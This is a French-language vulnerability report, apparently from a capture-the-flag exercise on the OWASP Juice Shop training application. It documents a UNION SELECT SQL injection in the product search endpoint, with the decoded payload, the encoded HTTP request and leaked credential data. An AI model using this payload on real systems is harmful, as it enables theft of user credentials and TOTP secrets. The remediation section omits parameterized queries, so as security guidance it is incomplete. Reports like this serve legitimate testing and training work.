# Rapport de Vulnérabilité

## Vulnérabilité

| Champ                      | Détails                                                                 |
|----------------------------|-------------------------------------------------------------------------|
| **Type**                   | Injection SQL — UNION SELECT (Exfiltration des credentials utilisateurs) |
| **Composant affecté**      | API REST — endpoint `GET /rest/products/search?q=`                      |
| **Sévérité**               | 🔴 Critique                                                             |

---

## Méthodologie

### Techniques utilisées
- Injection SQL manuelle (UNION-based)
- Exfiltration de données

### Outils utilisés

| Outil              | Objectif                                          |
|--------------------|---------------------------------------------------|
| Navigateur / Burp Suite | Construction et envoi du payload SQL injecté dans le paramètre `q` |

### Étapes

1. **Identification du paramètre vulnérable** — Le paramètre `q` de l'endpoint de recherche `GET /rest/products/search?q=` est directement injecté dans une requête SQL sans sanitisation.

2. **Détermination du nombre de colonnes** — La requête originale retourne 9 colonnes. Le payload doit donc fournir exactement 9 valeurs.

3. **Construction du payload UNION SELECT** — On forge un `UNION SELECT` qui joint les résultats de la table `Users` en concaténant les champs sensibles (`password`, `role`, `totpSecret`) dans une seule colonne pour les faire apparaître dans la réponse :
   ```sql
   ')) UNION SELECT 1,id,username,email,password||':'||role||':'||totpSecret,6,7,8,9 FROM Users--
   ```

4. **Encodage URL et envoi** — Le payload est encodé en URL et injecté dans le paramètre `q`. La réponse JSON contient les données de la table `Users` mélangées aux résultats produits normaux.

5. **Exfiltration** — Tous les comptes utilisateurs (email, hash du mot de passe, rôle, secret TOTP) sont retournés en clair dans la réponse.

---

### Preuve de concept

**Payload décodé :**
```sql
')) UNION SELECT 1,id,username,email,password||':'||role||':'||totpSecret,6,7,8,9 FROM Users--
```

**Requête HTTP :**
```http
GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%201%2Cid%2Cusername%2Cemail%2Cpassword%7C%7C%27%3A%27%7C%7Crole%7C%7C%27%3A%27%7C%7CtotpSecret%2C6%2C7%2C8%2C9%20FROM%20Users-- HTTP/2
Host: ctf.juice.cyber.epitest.eu
Authorization: Bearer <token>
```

**Exemple de données retournées :**
```json
{
  "id": 1,
  "username": "",
  "email": "admin@juice-sh.op",
  "description": "0192023a7bbd73250516f069df18b500:admin:"
}
```

---

## Risques

### Impact

- **Exfiltration complète des credentials** — tous les hashes de mots de passe, emails et rôles sont exposés
- **Compromission de comptes** — les hashes peuvent être crackés hors ligne 
- **Compromission totale de la plateforme** — avec les credentials admin récupérés, l'attaquant prend le contrôle complet de l'application

---

## Correction

### Correctifs

- Valider et assainir le paramètre `q` (longueur maximale, caractères autorisés)
- Ne jamais retourner des messages d'erreur SQL dans les réponses HTTP

### Bonnes pratiques de sécurité recommandées

- Suivre les directives OWASP Top 10 
- Stocker les mots de passe avec un algorithme de hachage robuste et salé (bcrypt, Argon2) — un hash MD5 non salé est trivial à cracker
- Mettre en place un WAF pour détecter les patterns d'injection SQL dans les paramètres de requête